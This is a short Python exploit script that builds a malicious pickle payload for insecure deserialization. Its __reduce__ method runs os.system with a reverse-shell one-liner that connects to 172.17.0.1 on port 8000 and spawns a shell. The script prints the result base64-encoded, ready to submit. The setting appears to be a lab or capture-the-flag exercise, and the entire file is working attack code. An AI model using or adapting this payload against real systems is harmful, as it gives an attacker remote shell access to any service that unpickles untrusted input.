import pickle
import base64

class Exploit:
    def __reduce__(self):
        import os
        # https://www.revshells.com/
        return ( (os.system, ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.17.0.1\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'",)))

if __name__ == '__main__':
    payload = Exploit()
    print(base64.b64encode(pickle.dumps(payload)).decode())
